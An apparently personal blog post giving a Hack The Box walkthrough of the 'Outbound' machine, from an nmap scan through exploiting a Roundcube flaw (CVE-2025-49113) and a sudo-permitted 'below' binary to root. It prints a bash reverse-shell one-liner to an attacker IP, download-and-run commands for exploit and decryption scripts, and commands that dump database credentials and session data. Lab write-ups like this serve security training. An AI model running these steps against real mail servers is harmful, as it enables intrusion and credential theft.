---
layout: post
title: "Outbound HTB Writeup"
date: 2025-07-20 13:54:00 +0300
categories: [HackTheBox, Machines]
tags: [cybersecurity, hacking, hackthebox, machines]
---

# Outbound HTB Writeup

## Importance of This Machine

Hello! Today I want to talk about a machine called **Outbound**. In my opinion, this machine was a great example of how important it is to keep up with cybersecurity news. In June 2025, the mail provider **cock.li** was hacked using a vulnerability identified as **CVE-2025-49113**.

## What is CVE-2025-49113?

> **CVE-2025-49113** is an authenticated remote code execution (RCE) vulnerability in Roundcube Webmail. 
{: .prompt-tip }

## Writeup

### Initial Scanning

I started with an Nmap scan:

<code>
nmap -sV 10.10.11.77
</code>

Only two ports were open:

- SSH (22)
- HTTP (80)

### Exploring the Web Service

When I visited the HTTP port in the browser, I realized I needed to add `mail.outbound.htb` to my `/etc/hosts` file.

After that, accessing the domain revealed a Roundcube login page.

> (I actually remembered this from a previous leak 😅)

According to the information on the [Hack The Box machine page](https://app.hackthebox.com/machines/Outbound), we are given credentials for a user named **tyler**.

---

### Exploiting CVE-2025-49113

I used the public exploit for CVE-2025-49113:

<code>
wget https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE-2025-49113.php
</code>

Then ran:

<code>
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'sh -i &gt;&amp; /dev/tcp/10.10.14.87/2311 0&gt;&amp;1'"
</code>

> ✅ This gave me a shell as the `www` user!

---

### Enumeration

Inside the web directory, I found the Roundcube configuration file:

<code>
cat /var/www/html/roundcube/config/config.inc.php
</code>

It contained MySQL credentials:

<code>
Username: roundcube  
Password: RCDBPass2025
</code>

I logged into the database:

<code>
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
</code>

Then ran:

<code>
USE roundcube;  
SELECT * FROM session;
</code>

This revealed base64-encoded serialized session data. After decoding it, I found:

<code>
username|s:5:"jacob";  
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
</code>

---

### Cracking the Password

To decrypt the password, I used the following Python script:

<code>
curl https://raw.githubusercontent.com/dogujen/dogujen.github.io/refs/heads/main/assets/des-decrypt-outbound.py -o des-decrypt-outbound.py && python des-decrypt-outbound.py
</code>

**Output:**

<code>
Decrypted password: ********
</code>

Now, I could log in via SSH using Jacob’s credentials.

---

### Privilege Escalation

Once inside, I ran:

<code>
sudo -l
</code>

I had permission to run a binary called `below`. After some quick research, I found a [privilege escalation exploit](https://github.com/rvizx/CVE-2025-27591) for it.

Running the exploit script gave me **root access**.

---

Thanks for reading! 😄  
Happy hacking!
